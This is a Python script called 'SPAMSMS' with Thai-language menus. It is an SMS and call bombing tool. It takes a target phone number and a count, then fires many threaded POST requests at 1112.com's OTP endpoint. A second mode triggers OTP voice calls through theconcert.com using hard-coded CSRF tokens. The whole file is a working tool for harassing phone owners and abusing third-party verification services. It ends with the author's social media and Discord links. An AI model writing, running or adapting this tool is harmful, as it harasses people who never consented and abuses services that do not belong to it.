import requests,json
import random
import pyfiglet
import os
import time
import threading
from requests import get
from re import search
from bs4 import BeautifulSoup as bs
from user_agent import generate_user_agent
import requests as ru
from requests import Session
os.system("clear")
print("") 

ascii_banner = pyfiglet.figlet_format(" SPAMSMS")



def banner():
	print(f"{ascii_banner}")
	
	
banner()
print("[1] api 1112")
print()
print("[2] api call *ออกบางครั้ง")
print()
print("[3] เครดิต")
print()
print("[00] ออก")
print()
f = input("Number />")
print()
os.system("clear")
if f == '1':
 banner()
 print("1112 MODE")
 print()
 phone = input("เบอร์เป้าหมาย > ")
 jam = int(input("จำนวน > "))
 print()
 def api1():
 	requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
	    "language": "th"},headers={"accept": "application/json, text/plain, /",
	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
 print(f"[+] ATTACK 1112 {phone}")
	
 for i in range(jam):
	 threading.Thread(target=api1).start()

if f == '2':
 banner()
 print("CALL MODE")
 print()
 mobile = input("เบอร์เป้าหมาย > ")
 print()
 def call():
      r = requests.post("https://www.theconcert.com/rest/request-otp",headers={"content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","user-agent": generate_user_agent(),"x-requested-with": "XMLHttpRequest","x-csrf-token": "VfYNo3-RJK5IK0axoCE7KLIAPbW9K0IbL8","x-xsrf-token": "b2b9a4f732d05668c61e64f836417f67/iS0TaMFdXciRQYns4jNXpeVYy3DlvGY6ML+q8oquXvseUvcnIelmUwwR9/wJHKHjGKfN0+WS9orN1zdtt4J3I72qJ3x4Va07eBC0isPMu4ktiZw5DvLqJ9l39rFP"},json={"mobile":mobile,"country_code":"TH","lang":"th","channel":"call","digit":4})
      print("ส่งcallสำเร็จ")

 call()
 
if f == '3':
 print("Facebook : Sorakrit Nonthawong")
 print("Discord : https://discord.com/invite/YknWyFmCGc")
 print("Youtube : PABUSX2")
 
if f == '00':
 print("")
 os.system("exit")
